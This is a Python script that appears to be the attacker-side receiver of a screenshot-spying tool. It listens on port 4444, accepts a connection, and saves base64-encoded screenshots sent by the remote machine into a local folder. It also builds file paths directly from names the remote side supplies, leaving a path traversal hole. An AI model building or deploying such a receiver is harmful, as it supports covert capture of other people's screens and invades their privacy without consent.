import base64
import json
import socket
import os

ip = "10.0.2.15" # change ip address
port = 4444 # change port number
address = (ip, port)
size = 1024
format = "UTF-8"
directory = "Screenshot"

def make_directory():
    try:
        os.mkdir(directory)
    # If the directory already exists
    except:
        pass

def receive_data(connection):
    all_json_data = ""
    while True:
        try:
            json_data = connection.recv(size)
            json_data = json_data.decode(format)
            all_json_data = all_json_data + json_data
            return json.loads(all_json_data)
        except json.decoder.JSONDecodeError:
            continue

if __name__ == '__main__':
    make_directory()
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(address)
    server.listen()
    print("[+]Server is listening.")
    conn, addr = server.accept()
    print(f"[+]Got a connection from {addr[0]}")
    while True:
        filename = conn.recv(size).decode(format)
        path = directory + "/" +  filename
        print("\n" + filename)
        data = receive_data(conn)   
        with open(path, "wb") as file:
            file.write(base64.b64decode(data))
        print("[+]Screenshot saved")
            
    